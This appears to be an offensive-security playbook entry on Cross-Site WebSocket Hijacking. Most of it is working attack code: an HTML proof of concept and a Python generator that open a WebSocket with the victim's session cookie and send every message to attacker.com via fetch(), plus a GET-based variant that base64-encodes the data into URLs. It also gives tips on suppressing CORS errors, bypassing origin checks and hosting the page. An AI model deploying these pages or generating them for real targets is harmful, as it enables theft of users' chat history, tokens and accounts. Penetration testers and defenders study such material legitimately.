# Cross-Site WebSocket Hijacking (CSWSH)

## When this applies

- WebSocket handshake authenticates via session cookie only.
- No CSRF token in handshake; no Origin validation (or naive substring check).
- Goal: open a WebSocket from the attacker's origin using the victim's session cookie, exfiltrating messages.

## Technique

Host an HTML page that opens a WebSocket to the target. The browser auto-attaches the victim's session cookie. The attacker page subscribes to events and exfiltrates them via fetch() to attacker.com.

## Steps

### CSWSH PoC

```html
<html>
<head><title>Loading...</title></head>
<body>
<script>
    var ws = new WebSocket('wss://target.com/chat');

    ws.onopen = function() {
        console.log('[+] WebSocket connected');
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        console.log('[+] Received:', event.data);

        // Exfiltrate data
        fetch('https://attacker.com/collect', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };

    ws.onerror = function(error) {
        console.log('[!] Error:', error);
    };
</script>
</body>
</html>
```

### Generator script

```python
#!/usr/bin/env python3

def generate_cswsh_exploit(websocket_url, exfil_url):
    exploit = f"""<html>
<head><title>Loading...</title></head>
<body>
<script>
    var ws = new WebSocket('{websocket_url}');

    ws.onopen = function() {{
        console.log('[+] WebSocket connected');
        ws.send("READY");
    }};

    ws.onmessage = function(event) {{
        console.log('[+] Received:', event.data);

        fetch('{exfil_url}', {{
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        }});
    }};

    ws.onerror = function(error) {{
        console.log('[!] Error:', error);
    }};
</script>
</body>
</html>"""
    return exploit

exploit = generate_cswsh_exploit(
    websocket_url="wss://target.com/chat",
    exfil_url="https://attacker.com/collect"
)

print(exploit)
```

### GET-based exfiltration alternative

When a Collaborator/OOB server is not available, exfiltrate via GET request to an access-logged server:

```html
<script>
    var ws = new WebSocket('wss://target.com/chat');
    ws.onopen = function() { ws.send("READY"); };
    ws.onmessage = function(event) {
        // Exfiltrate via GET — visible in access logs
        fetch('https://attacker.com/log?data=' + btoa(event.data), {
            method: 'GET',
            mode: 'no-cors'
        });
    };
</script>
```

**Note**: Use `mode: 'no-cors'` to suppress CORS errors in victim's browser; the request still fires. Victim's chat history (including credentials sent via messages) will appear in your server logs.

### CSWSH testing checklist

```
□ Check for CSRF tokens in handshake
□ Validate origin checking
□ Create CSWSH proof-of-concept
□ Test data exfiltration
□ Test unauthorized actions
□ Verify impact on real users
```

### Real-world example — Gitpod CSWSH (2023)

```
Severity: High (8.1)
Affected: Gitpod cloud platform
Exploit: Missing origin validation + no CSRF token
Impact: Full account takeover
```

## Verifying success

- Attacker's HTTP server logs (or Collaborator) receive messages from the victim's WebSocket session.
- Messages contain sensitive data (chat history, tokens, internal events).
- The attack works even when victim is on a different tab — the WebSocket keeps streaming.

## Common pitfalls

- Strict `SameSite=Lax`/`Strict` cookies prevent the cookie from accompanying the cross-origin WS handshake — modern browsers default to Lax. CSWSH only works on Lax-vulnerable WebSocket upgrades or `SameSite=None`.
- Origin validation may use suffix match — `attacker-target.com` may bypass.
- Some apps require an authentication message AFTER handshake — capture and replay it in your PoC.

## Tools

- Static HTML hosting (GitHub Pages, ngrok, public S3)
- Burp Collaborator (data exfil)
- Burp Suite (record + replay handshake)
